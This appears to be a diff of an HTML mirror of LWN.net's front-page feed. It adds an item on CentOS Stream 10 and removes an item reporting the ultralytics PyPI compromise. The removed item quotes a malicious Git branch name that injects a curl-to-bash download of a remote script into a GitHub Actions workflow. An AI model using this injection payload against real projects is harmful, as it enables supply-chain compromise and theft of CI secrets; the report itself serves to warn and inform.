@@ -38,6 +38,7 @@
         listing all articles which are posted to the site front page.
 </h2>
 <br><ul>
+<li><a href="#https://lwn.net/Articles/986792/" title="See Description">[$] A look at CentOS Stream 10</a></li>
 <li><a href="#https://lwn.net/Articles/1001732/" title="See Description">Stable kernel 6.6.65 fixes two regressions</a></li>
 <li><a href="#https://lwn.net/Articles/998576/" title="See Description">[$] Auto-tuning the kernel</a></li>
 <li><a href="#https://lwn.net/Articles/1001728/" title="See Description">Security updates for Wednesday</a></li>
@@ -52,10 +53,30 @@
 <li><a href="#https://lwn.net/Articles/1001436/" title="See Description">Two new stable kernels</a></li>
 <li><a href="#https://lwn.net/Articles/1001435/" title="See Description">Kernel prepatch 6.13-rc2</a></li>
 <li><a href="#https://lwn.net/Articles/1001433/" title="See Description">Security updates for Monday</a></li>
-<li><a href="#https://lwn.net/Articles/1001215/" title="See Description">Abusing Git branch names to compromise a PyPI package</a></li>
 </ul>
 <p></p>
 <br><table align="center">
+<tr><td><a name="https://lwn.net/Articles/986792/"></a></td></tr>
+<tr><td><div class="date"><tt>Wed, 11 Dec 2024 19:10:56 +0000</tt></div></td></tr>
+<tr><td><div>
+<div style="float:left" class="link"><a href="https://lwn.net/Articles/986792/" title="https://lwn.net/Articles/986792/">[$] A look at CentOS Stream 10</a></div>
+<div id="linkback" onclick="history.back()" onmouseout="this.className='off'" onmouseover="this.className='active'">back</div>
+</div></td></tr>
+<tr><td><div class="item"><blockquote><blockquote><p>The <a
+href="https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10-beta/html/10.0_beta_release_notes/index">Red
+Hat Enterprise Linux (RHEL) 10 beta</a> was released in mid-November
+and, if all goes according to plan, <a
+href="https://www.centos.org/centos-stream/">CentOS&nbsp;Stream</a>&nbsp;10
+should be released before the end of the year. While nothing is etched
+in stone just yet, it is a good time for anyone using or targeting
+RHEL (and its clones) to start taking a look at how Stream&nbsp;10,
+and the corresponding <a
+href="https://docs.fedoraproject.org/en-US/epel/epel-about/">EPEL</a>
+repository, is shaping up. This is not only important to RHEL and
+Stream users, but anyone deploying and supporting software on
+enterprise Linux (EL) derivatives like AlmaLinux, Oracle&nbsp;Linux,
+and Rocky&nbsp;Linux as well.</p>
+</blockquote></blockquote></div></td></tr>
 <tr><td><a name="https://lwn.net/Articles/1001732/"></a></td></tr>
 <tr><td><div class="date"><tt>Wed, 11 Dec 2024 17:43:08 +0000</tt></div></td></tr>
 <tr><td><div>
@@ -284,38 +305,6 @@ href="https://lwn.net/Articles/998221/">this article</a>.</blockquote></blockquo
 </div></td></tr>
 <tr><td><div class="item"><blockquote><blockquote>Security updates have been issued by <b>AlmaLinux</b> (redis:7, ruby, ruby:2.5, and ruby:3.1), <b>Debian</b> (avahi, ceph, chromium, gsl, jinja2, php7.4, renderdoc, ruby-doorkeeper, and zabbix), <b>Fedora</b> (chromium, python3.11, and uv), <b>Gentoo</b> (Asterisk, Cacti, Chromium, Google Chrome, Microsoft Edge. Opera, Dnsmasq, firefox, HashiCorp Consul, icinga2, OATH Toolkit, OpenJDK, PostgreSQL, R, Salt, Spidermonkey, and thunderbird), <b>Mageia</b> (kubernetes), <b>Red Hat</b> (grafana, grafana-pcp, osbuild-composer, and postgresql), <b>SUSE</b> (ansible-core, firefox, glib2, java-1_8_0-ibm, kernel-firmware, nanopb, netty, python310-django-ckeditor, python310-jupyter-ydoc, radare2, skopeo, and webkit2gtk3), and <b>Ubuntu</b> (tinyproxy).
 </blockquote></blockquote></div></td></tr>
-<tr><td><a name="https://lwn.net/Articles/1001215/"></a></td></tr>
-<tr><td><div class="date"><tt>Fri, 06 Dec 2024 18:44:12 +0000</tt></div></td></tr>
-<tr><td><div>
-<div style="float:left" class="link"><a href="https://lwn.net/Articles/1001215/" title="https://lwn.net/Articles/1001215/">Abusing Git branch names to compromise a PyPI package</a></div>
-<div id="linkback" onclick="history.back()" onmouseout="this.className='off'" onmouseover="this.className='active'">back</div>
-</div></td></tr>
-<tr><td><div class="item"><blockquote><blockquote><p>
-A compromised release was uploaded to PyPI after a project automatically processed a pull request with a flawed script.
-The GitHub account 
-<a href="https://github.com/openimbot">
-"OpenIM Robot"</a>
-(which appears to be controlled by
-<a href="https://nsddd.top/">Xinwei Xiong</a>) opened
-<a href="https://github.com/ultralytics/ultralytics/pull/18018">a pull request</a> for the 
-<a href="https://pypi.org/project/ultralytics/">
-ultralytics</a>
-Python package. The pull request included a suspicious Git branch name:
-</p>
-
-<blockquote class="bq" style="">
-openimbot:$({curl,-sSfL,raw.git<wbr>hub<wbr>user<wbr>content.com/ultra<wbr>lytics/<wbr>ultra<wbr>lytics/<wbr>12e4f5<wbr>4ca3<wbr>f2e6<wbr>9bcdc<wbr>900d<wbr>1c6e<wbr>16642<wbr>ca8ae<wbr>545/file.sh}${IFS}|${IFS}bash)
-</blockquote>
-
-<p>
-Unfortunately, ultralytics uses the
-<a href="https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#pull_request_target"><tt>pull_request_target</tt></a> GitHub Action trigger to automate some of its continuous-integration tasks. This runs a script from the base branch of the repository, which has access to the repository's secrets — but that script was vulnerable to a shell injection attack from the branch name of the pull request. The injected script appears to have used the credentials it had access to in order to compromise a later release uploaded to PyPI to include a cryptocurrency miner. It is hard to be sure of the details, because GitHub has already removed the malicious script.
-</p>
-
-<p>
-This problem has been
-<a href="https://nathandavison.com/blog/github-actions-and-the-threat-of-malicious-pull-requests">known</a> for several years, but this event may serve as a good reminder to be careful with automated access to important secrets.
-</p></blockquote></blockquote></div></td></tr>
 </table>
 </body>
 </html>
